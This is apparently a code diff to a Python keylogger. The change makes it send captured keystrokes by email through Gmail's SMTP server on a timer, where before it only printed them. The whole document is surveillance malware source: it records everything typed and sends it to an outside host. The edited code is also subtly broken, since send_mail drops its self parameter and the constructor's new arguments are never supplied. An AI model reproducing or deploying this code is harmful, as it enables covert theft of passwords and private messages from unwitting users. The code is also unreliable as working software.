@@ -1,11 +1,16 @@
-import pynput.keyboard , smtplib
+import pynput.keyboard 
 import threading
+import smtplib
+
 
 
 class Keylogger:
 
-    def __init__(self):
-        self.log = ""
+    def __init__(self , time_interval , email , password ):
+        self.log = "Keylogger has started......"
+        self.interval = time_interval
+        self.email = email 
+        self.password = password 
 
 
     def append_to_log(self , string):
@@ -24,9 +29,9 @@ class Keylogger:
     
 
     def report(self):
-        print(self.log)
+        self.send_mail(self.email , self.password , "\n\n" + self.log )
         self.log = ""
-        timer = threading.Timer(5, self.report)
+        timer = threading.Timer(self.interval , self.report)
         timer.start()
 
     def start(self):
@@ -35,13 +40,14 @@ class Keylogger:
             self.report()
             keyboard_listener.join()
     
-    def send_mail(self , email , password , message):
-        server = smtplib.SMTP("smtp.gmail.com" , 587)
-        server.starttls()
-        server.login(email , password)
-        server.sendmail(email , email , message)
-        server.quit()
 
-#USE YOUR EMAIL AND PASSWORD , USE APP PASSWORD IF YOU HAVE 2FA ENABLED . 
+    def send_mail(email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
+    
+
 my_keylogger = Keylogger()
 my_keylogger.start() 
